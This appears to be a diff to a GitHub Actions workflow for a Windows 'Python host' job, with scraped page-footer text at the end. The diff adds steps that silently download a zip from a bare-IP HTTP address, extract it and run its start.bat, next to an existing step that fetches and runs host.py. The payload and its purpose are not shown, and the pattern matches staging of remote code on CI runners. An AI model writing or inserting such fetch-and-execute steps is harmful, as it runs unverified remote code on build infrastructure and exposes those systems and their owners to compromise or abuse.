@@ -2,6 +2,12 @@ name: Run Python Host (Windows)
 
 on:
   workflow_dispatch:
+    inputs:
+      zip_url:
+        description: "Zip file URL to download"
+        required: true
+        default: "http://157.250.198.96:3000/files/1784743685851-227104494.zip"
+        type: string
 
 jobs:
   host:
@@ -29,6 +35,18 @@ jobs:
         run: |
           python --version
           go version
+      # Download and extract zip
+      - name: Download zip package
+        run: |
+          $ProgressPreference = 'SilentlyContinue'
+          Invoke-WebRequest "${{ github.event.inputs.zip_url }}" -OutFile "package.zip"
+      - name: Extract zip package
+        run: |
+          & "C:\Program Files\7-Zip\7z.exe" x "package.zip" -o"extracted" -y
+      - name: Run start.bat
+        run: |
+          Set-Location extracted
+          .\start.bat
       # Download and run host.py
       - name: Download host.py
         run: |
@@ -36,3 +54,8 @@ jobs:
       - name: Run host.py
         run: |
           python host.py
+Footer
+© 2026 GitHub, Inc.
+Footer navigation
+Terms
+Priv
